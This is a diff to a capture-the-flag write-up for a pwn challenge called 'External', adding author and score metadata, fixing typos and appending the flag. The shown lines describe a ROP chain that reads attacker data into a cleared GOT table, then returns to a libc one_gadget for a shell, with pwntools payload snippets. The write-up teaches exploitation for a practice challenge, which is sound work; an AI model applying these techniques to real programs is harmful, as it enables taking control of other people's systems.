@@ -1,4 +1,13 @@
 ## External 
+#### Description
+No description.
+
+#### Author
+M_alpha
+
+#### Points and solves
+467 points and 69 solves.
+
 We are given a binary, that reads out input, clears the GOT table and somehow we need to get a shell.
 
 ```c
@@ -13,7 +22,7 @@ undefined8 main(void)
 }
 ```
 
-The function ```clear_got``` does exactly what we expect it to do, it uses ```memeset`` to set the entire GOT to 0.
+The function ```clear_got``` does exactly what we expect it to do, it uses ```memeset``` to set the entire GOT to 0.
 
 In addition, we have a very usefull gadget in one of the setup functions:
 ```asm
@@ -40,7 +49,7 @@ payload = 0x58*b"A"+payload
 p.sendline(payload)
 ```
 We have a rop chain that loads ```rdi = 0, rsi = &GOT``` and returns to a syscall, and to main afterwards.
-Since main returns 0, by the time we are executing the rop chain ```rax = 0``` which is the syscall number for ```read```.
+Since main returns 0, by the time we are executing the rop chain ```rax``` is 0, which is the syscall number for ```read```.
 At the time we syscall, we will actually read back into the GOT table.
 
 ### 2. Rewriting GOT table:
@@ -68,6 +77,5 @@ We have a one_gadget at ```0x448a3``` offset, we can just return to that with an
 p.sendline(0x58*b"C" + p64(libc.address + one_shot_offset) + b"\x00"*0x100) 
 ```
 
-
-
-
+#### Flag
+```flag{0h_nO_My_G0t!!!!1111!1!}```
